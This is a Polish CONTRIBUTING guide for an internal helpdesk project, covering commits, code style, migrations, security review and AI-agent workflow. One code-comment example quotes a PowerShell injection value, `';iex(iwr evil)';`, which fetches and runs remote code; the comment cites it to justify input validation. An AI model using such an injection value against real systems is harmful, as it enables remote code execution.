# Contributing

Konwencje wewnętrzne dla zespołu InfraDesk. Aktualnie jeden dev (Adrian) +
asystenci AI (Claude Code), ale spisane bo będzie skalować.

## Setup developerski

Patrz [README.md § Quick start](README.md#quick-start-lokalny-dev).

```bash
git clone git@github.com:SILERS-Adi/infradesk.git
cd infradesk
# .env per backend/frontend — popytaj o kopię od Adriana
```

## Branch strategy

- `main` — produkcja. Każdy push → deploy (wkrótce CI/CD).
- Feature branches: `feature/<short-desc>` lub `fix/<short-desc>`.
- Hotfix: `hotfix/<short-desc>` ze skipem CI tylko jeśli production down.
- Nigdy `master` (legacy z v1, używamy `main`).

## Commit messages

Używamy luźnego conventional commits — krótkie ale opisowe.

```
<type>(<scope>): <short summary>

<optional body — WHY, nie WHAT>

<optional footer (Co-authored-by, etc.)>
```

**Typy:** `feat`, `fix`, `chore`, `refactor`, `docs`, `test`, `perf`, `security`.

**Scope (opcjonalne):** `backend`, `frontend`, `agent`, `db`, `infra`, `id-panel`,
lub konkretny moduł (`tickets`, `auth`, `vault`).

**Przykłady:**
```
feat(tickets): waitingType enum + parent-child duplicate link
fix(auth): close redirect loop on /accept-invite when token expired
chore: bump prisma to 5.22.0
docs: add deploy procedure for asystent v5
security(rls): add policy on UserEmailAccount + EmailMessage
```

**NIE rób:**
- `update`, `wip`, `fix bug` — bezwartościowe
- Dłuższe niż 70 znaków subject
- Mieszania scopes w jednym commit (zrób dwa)

## Pull Request flow (gdy zacznie być >1 dev)

1. Branch z `main`
2. Praca lokalnie + commity
3. `git push origin <branch>`
4. PR przez GitHub UI z:
   - Krótkim opisem WHY
   - Screenshotem dla zmian UI
   - Listą smoke testów
5. Self-review przed prośbą o merge
6. Squash & merge do `main`

**Wymagane PRZED merge (po dodaniu CI):**
- [ ] `npx tsc --noEmit` clean (backend + frontend)
- [ ] `npx prisma validate` clean
- [ ] `npm audit --audit-level=high` clean
- [ ] Smoke test krytycznego flow (login + ticket create)
- [ ] Code review (lub self-review + checklist)

## Code style

### TypeScript (backend + frontend)

- Strict mode: `tsconfig.json` ma `strict: true`
- 2 spaces indent
- Single quotes (`'`) dla string literals, double dla JSX attribute
- Trailing commas wszędzie gdzie multi-line
- Async/await, NIE `.then().catch()` chains (chyba że tylko 1 poziom)
- Error handling: ZAWSZE `try/catch` w handlerze, throw `HttpError`, catch i przekaż do `next(err)`
- Brak `any` (jak najmniej `unknown`, jak najwięcej concrete types)
- Importy uporządkowane: external → internal → relative (auto przez `@trivago/prettier-plugin-sort-imports`)

### React

- Function components only
- Hooks rules: ESLint plugin enforced
- Naming: `PascalCase` dla components, `camelCase` dla hooks (`useXxx`)
- Routing: lazy load wszystkie strony przez `lazyNamed()` w `App.tsx`
- Styling: Tailwind utility classes pierwsze. Custom CSS tylko w `styles/globals.css` lub `*.module.css`
- State: Zustand dla global, `useState`/`useReducer` dla lokal, React Query dla server state

### Python (agent)

- 4 spaces indent
- f-strings dla formatowania
- `subprocess.run(args=[...])` zawsze list, NIGDY string z `shell=True` (chyba że stałe args)
- Type hints PEP 604 (`str | None`, nie `Optional[str]`)
- `from __future__ import annotations` w nowych plikach
- Logger: `from .config import log` + `log.info/warning/error()`
- Docstrings dla public functions w core/

### SQL (Prisma)

- Schema w `backend-v2/prisma/schema.prisma`
- Migracje IDEMPOTENTNE (`IF NOT EXISTS`, `DO $$ EXCEPTION WHEN duplicate_object THEN NULL; END $$`)
- Każdy nowy model workspace-scoped: ZAWSZE `workspace` relation + `@@index([workspaceId])` + RLS policy
- Nigdy `prisma migrate reset` na produkcji — irreversible

## Komentarze

Pisz **dlaczego**, nie **co**.

```ts
// ❌ ŹLE — narrating
// Pętla po użytkownikach
for (const u of users) { ... }

// ❌ ŹLE — referencja do task/audit
// K12 fix: walidacja FK
await validateTaskFKs(...);

// ✅ DOBRZE — WHY (security/business)
// LLM hallucination loops mogą mass-create tickets — cap 8 mutacji per chat.
const MUTATING_TOOLS = new Set([...]);

// ✅ DOBRZE — non-obvious invariant
// Kursor jest interpolowany do `[DateTime]'{cursor}'` w PowerShell. Lokalny admin
// podstawiający `';iex(iwr evil)';` dostałby SYSTEM RCE — stąd regex validation.
const _CURSOR_RX = re.compile(r"^\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}(\.\d+)?$");
```

**Default: brak komentarza.** Dobre nazwy + small functions > komentarze.

## Security review

Każda zmiana sensitive (auth, vault, agent commands, payments) wymaga:
1. Self-review wg [`docs/security.md` checklist](docs/security.md#api-hardening-checklist)
2. Test ręczny: cross-workspace izolacja działa, Bearer wymagany, rate limit działa
3. Po deploy: 30 min monitor `pm2 logs --err`

## Database changes

1. Edit `backend-v2/prisma/schema.prisma`
2. `npx prisma validate` lokalnie
3. Wygeneruj migrację: `npx prisma migrate dev --name <nazwa> --create-only`
4. **Sprawdź wygenerowany SQL:**
   - Idempotentny? (`IF NOT EXISTS`)
   - RLS policy jeśli nowy model workspace-scoped?
   - Index na FK?
   - Cascade behavior poprawne?
5. Jeśli OK: commit + push (`prisma migrate deploy` na prod przy następnym deployu)
6. **NIGDY** edytuj wygenerowanej migracji po deployu

## Testowanie

**Aktualnie brak test suite.** Plan P1: Vitest backend + RTL frontend + Playwright E2E.

Do tego czasu — manual smoke testing wg checklist `docs/deploy.md § 6`.

## Praca z AI agentami (Claude Code)

Projekt ma `CLAUDE.md` w root z pełnym kontekstem. Agent czyta go automatycznie.

Best practices:
- Nie commit'uj kodu wygenerowanego przez AI bez self-review
- Commit message zawiera `Co-Authored-By: Claude Opus 4.7 <noreply@anthropic.com>` gdy AI pomagało
- Long-running tasks: agent może spawnować sub-agentów. Trust but verify (czytaj diff).
- Pamięć agent-a: `~/.claude/projects/C--Users-adria-infradesk/memory/` — nie commit'ować

## Komunikacja

- **Slack/Signal:** dla bieżącej pracy (na razie głównie z owner ad-hoc)
- **GitHub Issues:** dla long-form bugów + feature requests
- **Postmortems:** `~/incidents/` (gitignored, lokalne notatki — można potem opublikować)

## Onboarding nowego dewelopera

1. Czytaj kolejno: README → CLAUDE.md → docs/architecture.md → docs/security.md
2. Lokalny setup wg README
3. Dostęp:
   - GitHub: zaproszenie do `SILERS-Adi/infradesk`
   - SSH do prod: klucz publiczny od owner'a → dodanie do `~/.ssh/authorized_keys`
   - .env: kopia od owner'a (Bitwarden/1Password vault)
4. Pierwsza tura: read-only sesja na prod, przejrzyj logi pm2, schedulers, DB struktura
5. Pierwszy task: drobny bug fix lub doc improvement (low-risk warm-up)
6. Pełen dostęp produkcyjny po 2 tygodniach + 5 merged PR

## Zasoby zewnętrzne

- [Prisma docs](https://www.prisma.io/docs)
- [React Query](https://tanstack.com/query/latest)
- [Tailwind](https://tailwindcss.com/docs)
- [Anthropic API](https://docs.claude.com/en/api/) — dla Iris features
- [Postgres RLS](https://www.postgresql.org/docs/16/ddl-rowsecurity.html)
